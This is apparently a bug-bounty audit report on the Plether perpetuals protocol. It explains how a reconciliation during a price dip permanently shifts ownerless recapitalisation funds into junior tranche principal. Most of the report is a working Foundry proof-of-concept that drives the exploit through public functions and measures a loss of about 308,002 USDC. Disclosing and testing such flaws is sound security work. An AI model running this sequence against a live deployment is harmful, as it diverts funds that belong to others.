# \#100096 [SC-Medium] Fresh reconciliation permanently transfers unassigned assets to junior holders

**Submitted on Nov 16th 2026 at 08:17:23 UTC by @krikolkk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100096
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
`unassignedAssets` holds ownerless pool value until governance assigns it, and fresh reconciliation applies losses to tranche principal first. However, when a fresh mark puts distributable value below `unassignedAssets`, reconciliation permanently caps that balance; after recovery, the excess restores senior principal to its high-water mark and then becomes junior principal. With the default 0.4 skew cap, the PoC moves 308,001.999963 USDC of a 1,000,000 USDC recap into junior principal after a transient dip.

## Vulnerability Details
An owner can recapitalize a seeded pool above the senior high-water-mark gap, placing the excess in `unassignedAssets` (`U`). A fresh reconciliation calculates distributable value (`D`) after position PnL and pending buckets, then caps `U` to `D` when the dip has wiped both tranche principals:

```solidity
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

The cap is stored by `HousePool._reconcile`, but the shortfall is not recorded as a recovery claim. When a later reconciliation sees recovered value, the `claimedEquityZero` path seeds it through `applyRevenueIntent`: senior principal is restored to its high-water mark first, then the remainder is credited to junior principal. Neither path restores `U`.

A trader can open a position whose notional is admitted because `unassignedAssets` contributes to pool depth. In the default-configuration PoC, a 460,000-notional short is opened against a 1,000,000 USDC recap and about 152,000 USDC of combined tranche principal. At a transient 2.00 mark, its 460,000 USDC paper loss exceeds tranche principal, leaving `D = 691,998.000037` USDC; the fresh reconcile caps `U` to `D`.

Anyone can trigger this fresh-mark reconciliation through permissionless `OrderRouter.settleLpEpoch` when matured LP-epoch work exists; a matured redeem request supplies that work. When the mark returns to 1.00 and the trader closes flat, the next reconciliation restores senior principal to its high-water mark and credits the remaining recovered value to junior principal. `U` remains capped, so 308,001.999963 USDC never returns to the ownerless pool.

## Impact Details
Governance permanently loses the ability to assign ownerless value supplied through recapitalization. The lost amount is bounded by the paper loss beyond combined tranche principal and by the open position admitted under the configured skew cap; at the default 0.4 cap, the PoC loses 308,001.999963 USDC (30.8% of the 1,000,000 USDC recap).

Junior holders receive that value as principal without an explicit assignment. In the PoC, the passive 40,000 USDC junior holder gains about 241,587 USDC versus the control path; senior holders are unchanged.

## References
1. [`HousePoolReconcilePlanLib.planReconcile`, lines 73-104](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L73-L104)
2. [`HousePool._reconcile`, lines 1555-1599](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
3. [`HousePoolPendingPreviewLib.applyRevenueIntent`, lines 143-180](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L143-L180)


## Proof of Concept

## Proof of Concept

Save the Solidity source below as `test/poc/PoC/PoC.t.sol` relative to the repository root. From the repository root, run it with this single command:

```console
FOUNDRY_TEST=test/poc/PoC FOUNDRY_DISABLE_NIGHTLY_WARNING=1 forge test --match-path "test/poc/PoC/*.t.sol" -vvvv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {console2} from "forge-std/console2.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// A fresh LP-epoch reconcile that lands while the terminal NAV is below `unassignedAssets` permanently cuts
/// `unassignedAssets` to that NAV (HousePoolReconcilePlanLib.planReconcile). When the mark recovers, the recovered
/// value is seeded into the senior HWM gap and then junior principal; nothing ever refills `unassignedAssets`.
/// Ownerless value (the owner's recapitalisation) therefore ends up as junior principal without any assignment.
///
/// Risk parameters are the repository defaults (maxSkewRatio 0.4, carry 500 bps): nothing is relaxed. Every step after
/// the owner's recapitalisation goes through public entry points: vault requestDeposit / requestRedeem,
/// OrderRouter.commitOrder / executeOrder / settleLpEpoch (permissionless) with mocked Pyth updates.
contract PLTH092UnassignedDipPoC is BasePerpTest {
    address internal constant SEN = address(0x5E1); // passive senior LP
    address internal constant JR = address(0x71C); // passive junior LP (40k)
    address internal constant ATK = address(0xA77); // junior LP that triggers the reconcile (10k)
    address internal constant TRADER = address(0xAAA);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant RECAP = 1_000_000e6;
    uint256 internal constant SIZE = 460_000e18; // just under 0.4 x (S+J+U): the default maxSkewRatio cap
    uint256 internal constant ENTRY = 1e8;
    uint256 internal constant DIP = 2e8; // CAP_PRICE: SHORT (profits as the mark rises) is at its maximum profit

    uint256 internal clientNonce;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ---------------------------------------------------------------- public-entry helpers

    /// Anyone settles matured LP epochs through OrderRouter.settleLpEpoch (refreshes the mark from Pyth first).
    function _routerSettle(
        uint256 price
    ) internal {
        bytes[] memory update = _mockPythUpdateData(price);
        router.settleLpEpoch(update);
    }

    function _deposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 activation = vault.depositEpochStart(requestId);
        if (block.timestamp < activation) vm.warp(activation);
        _routerSettle(ENTRY);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // clear the vault's deposit cooldown
    }

    /// ATK queues a minimum-size junior redeem so settleLpEpoch has matured work, then the epoch matures and the router settles.
    function _queueAndSettle(
        uint256 price
    ) internal {
        uint256 sh = juniorVault.convertToShares(2 * pool.minTrancheDepositAssets()); // minimum-size redeem
        vm.prank(ATK);
        juniorVault.requestRedeem(sh, ATK, ATK);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _routerSettle(price);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(++clientNonce),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _tradeViaRouter(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, targetPrice, isClose);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _jrValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(JR));
    }

    function _senValue() internal view returns (uint256) {
        return seniorVault.convertToAssets(seniorVault.balanceOf(SEN));
    }

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  seniorPrincipal ", pool.seniorPrincipal());
        console2.log("  seniorHWM       ", pool.seniorHighWaterMark());
        console2.log("  juniorPrincipal ", pool.juniorPrincipal());
        console2.log("  unassignedAssets", pool.unassignedAssets());
        console2.log("  JR(40k) value   ", _jrValue());
    }

    // ---------------------------------------------------------------- PoC

    function test_PoC_dipReconcilePermanentlyMovesUnassignedToJunior() public {
        // ================= Arrange: seeded pool, owner recap far above the senior gap => U = 1,000,000 =================
        _deposit(seniorVault, SEN, 100_000e6);
        _deposit(juniorVault, JR, 40_000e6);
        _deposit(juniorVault, ATK, 10_000e6);

        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP); // no senior gap -> quarantined as ownerless value (unassignedAssets)
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _queueAndSettle(ENTRY);
        assertEq(pool.unassignedAssets(), RECAP, "recap sits in unassignedAssets");

        // Repository-default risk config is untouched: the skew cap is 0.4 of net pool depth.
        (, uint256 maxSkewRatio,,,,,,,,) = engine.riskParams();
        assertEq(maxSkewRatio, 0.4e18, "default maxSkewRatio");

        // A trader opens a 460k-notional SHORT at 1.00 (SHORT profits when the mark rises). Because unassigned assets
        // count as pool depth, this fits under the 0.4 skew cap although S+J is only ~152k.
        _fundTrader(TRADER, 60_000e6); // 40k margin + free equity for the keeper-bounty reservations
        _tradeViaRouter(CfdTypes.Side.SHORT, SIZE, 40_000e6, ENTRY, false, ENTRY);
        _log("before dip");

        uint256 s0 = pool.seniorPrincipal();
        uint256 j0 = pool.juniorPrincipal();
        uint256 u0 = pool.unassignedAssets();
        uint256 jr0 = _jrValue();
        uint256 sen0 = _senValue();
        uint256 poolAssets0 = pool.totalAssets();
        assertEq(u0, RECAP);
        assertEq(poolAssets0, s0 + j0 + u0, "no pending buckets: pool assets == S + J + U");

        // Independent reference values, derived from the dip mark and the pre-dip state only (never from the buggy path):
        //   pool's paper loss at the dip   = SIZE * (DIP - ENTRY) / 1e20           (size 18d * price 8d -> USDC 6d)
        //   terminal NAV at the dip  D     = (S + J + U) - paperLoss
        //   what a correct protocol keeps in U after a full round-trip = u0 (the mark returns to entry, nothing was won)
        //   leak out of U                  = u0 - D = paperLoss - (S + J)           (the part of the loss S and J cannot absorb)
        uint256 paperLoss = SIZE * (DIP - ENTRY) / 1e20;
        uint256 expectedD = s0 + j0 + u0 - paperLoss;
        uint256 expectedLeak = paperLoss - (s0 + j0);
        assertEq(expectedLeak, u0 - expectedD);
        assertGt(paperLoss, s0 + j0, "the dip loss exceeds S+J, so U is reached");
        // The position sits at >99.7% of the largest skew the default 0.4 cap admits (worst case for this config).
        assertGt(((SIZE * ENTRY) / 1e20) * 1e18 / poolAssets0, 0.399e18, "position near the 0.4 skew cap");

        uint256 snap = vm.snapshotState();

        // ================= CONTROL: identical path, nobody reconciles at the dip =================
        // The trader closes the SHORT flat at the same 1.00 mark: no economic change at all, and no reconcile ever
        // sees the transient mark. This is the correct reference outcome.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _tradeViaRouter(CfdTypes.Side.SHORT, SIZE, 0, 1, true, ENTRY);
        _queueAndSettle(ENTRY);
        uint256 uControl = pool.unassignedAssets();
        uint256 jControl = pool.juniorPrincipal();
        uint256 jrControl = _jrValue();
        _log("control: after recovery reconcile");
        assertEq(uControl, RECAP, "control: unassigned untouched");
        assertLt(jrControl > jr0 ? jrControl - jr0 : jr0 - jrControl, 10e6, "control: JR value ~unchanged");

        // ================= ATTACK: same history, but a reconcile runs at the dip =================
        vm.revertToState(snap);

        // Step 1: the mark spikes to the 2.00 cap; the pool's paper loss is 460k > S+J (~152k).
        // Anyone (here ATK, who has a matured minimum-size redeem request) calls the permissionless
        // OrderRouter.settleLpEpoch.
        _queueAndSettle(DIP);
        _log("attack: after dip reconcile");
        uint256 uDip = pool.unassignedAssets();
        assertEq(pool.seniorPrincipal(), 0, "senior wiped on paper at the dip");
        assertEq(pool.juniorPrincipal(), 0, "junior wiped on paper at the dip");
        assertEq(uDip, expectedD, "U permanently cut to the dip NAV: (S+J+U) - SIZE*(DIP-ENTRY)");

        // Step 2: the mark reverts to 1.00, the trader closes flat at entry (no net economic change), next reconcile.
        _tradeViaRouter(CfdTypes.Side.SHORT, SIZE, 0, 1, true, ENTRY);
        _queueAndSettle(ENTRY);
        _log("attack: after recovery reconcile");

        uint256 u1 = pool.unassignedAssets();
        uint256 jr1 = _jrValue();
        uint256 sen1 = _senValue();

        // ================= Assert =================
        // The mark is back at entry and the trader closed flat, so the correct end state is U == u0 (== control).
        assertEq(u1, uDip, "unassigned is never refilled after the mark recovers");
        uint256 uLost = uControl - u1;
        assertEq(uLost, expectedLeak, "leak == SIZE*(DIP-ENTRY) - (S+J), pinned from the dip price");
        assertEq(uLost, 308_001_999_963, "leak in USDC atoms (~30.8% of the 1M recap)");

        // The pool's cash is unchanged by the round-trip; the ownerless value reappears as junior principal.
        assertApproxEqAbs(
            pool.seniorPrincipal() + pool.juniorPrincipal() + u1, poolAssets0, 5e6, "round-trip is value-neutral"
        );
        uint256 jGain = pool.juniorPrincipal() - jControl;
        assertApproxEqAbs(jGain, uLost, 5e6, "junior principal absorbed exactly the ownerless value U lost");

        // The passive 40k junior holder (never acted) receives its pro-rata share of the leak; senior is untouched.
        uint256 jrShare = juniorVault.balanceOf(JR) * 1e18 / juniorVault.totalSupply();
        uint256 expectedJrGain = uLost * jrShare / 1e18;
        console2.log("JR share of junior shares (1e18)", jrShare);
        console2.log("JR expected gain (pro-rata of leak)", expectedJrGain);
        console2.log("JR measured gain vs control", jr1 - jrControl);
        assertApproxEqAbs(jr1 - jrControl, expectedJrGain, 5e6, "JR gain == pro-rata share of the leaked U");
        assertApproxEqAbs(sen1, sen0, 5e6, "senior unchanged");

        console2.log("unassigned: before / control / attack", u0, uControl, u1);
        console2.log("expected D (dip NAV)", expectedD);
        console2.log("ownerless value moved to junior", uLost);
        console2.log("JR(40k) value: before / control / attack", jr0, jrControl, jr1);
        console2.log("pool assets before", poolAssets0);
    }
}
```

```console
Ran 1 test for test/poc/PoC/PoC.t.sol:PLTH092UnassignedDipPoC
[PASS] test_PoC_dipReconcilePermanentlyMovesUnassignedToJunior()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```
